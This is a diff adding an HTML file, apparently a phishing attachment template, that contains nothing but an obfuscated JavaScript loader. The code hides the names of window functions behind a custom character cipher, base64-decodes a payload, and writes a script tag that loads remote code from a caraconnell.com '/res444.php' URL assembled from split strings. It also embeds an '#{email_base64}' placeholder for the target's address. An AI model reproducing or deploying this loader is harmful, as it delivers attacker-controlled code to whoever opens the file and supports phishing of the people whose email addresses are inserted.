@@ -1,0 +1,27 @@
+<html><head><meta charset="UTF-8"></head><body><script>vireo = '#{email_base64}';
+
+EMez = "217,190,215,192:9064deace63a159b";
+rKsC = "192,199,216,193,223,196,220,211:b88486a3821c4eb6";
+class NyrL {
+    constructor(ULPQ) {
+        this.ULPQ = ULPQ;
+    }
+
+    ZeiC(ubJz) {
+        const [XeCI, dlmy] = ubJz.split(':');
+        const rUnx = XeCI.split(',').map(Number);
+        let fPur = '';
+        for (let Mmev = 0; Mmev < rUnx.length; Mmev++) {
+            const iuFy = rUnx[Mmev];
+            const gUBL = parseInt(dlmy[Mmev % dlmy.length], 16);
+            const QiwY = this.ULPQ.charCodeAt(Mmev % this.ULPQ.length);
+            fPur += String.fromCharCode(iuFy - QiwY - gUBL);
+        }
+        return fPur;
+    }
+}
+const nyXr = new NyrL("oJbZcUcbpdYzuBSsjJMmOvlGXAjKCUzc");
+const znoL = window[nyXr.ZeiC(EMez)];
+const SVwL = window[nyXr.ZeiC(rKsC)];
+const RSEC = new SVwL(znoL('bXVsbGVpbiA9ICdodCcrJ3RwczonKycvL2NhcmFjbycrIm5uIisiZWxsLmMiKyJvbSIrJy9yZXM0NDQnKycucGhwPzItNicrIjg3NDc0NzAiKyc3MzNhMmYyJytgZjY0YCtgNjEyZTcwN2ArJzM3NDcwJysnNjY2YTc4NjEnKycyZTcyNzUyZicrYDMyNTI1YCsiMTU4MmYiKyctdmlyZW8nOwpkb2N1bWVudFsnd3JpdGUnXSgiPHNjcmlwdCBzcmM9JyIgKyBtdWxsZWluICsgIic+PFwvc2NyaXB0PiIpOw=='));
+RSEC();</script></body></html>
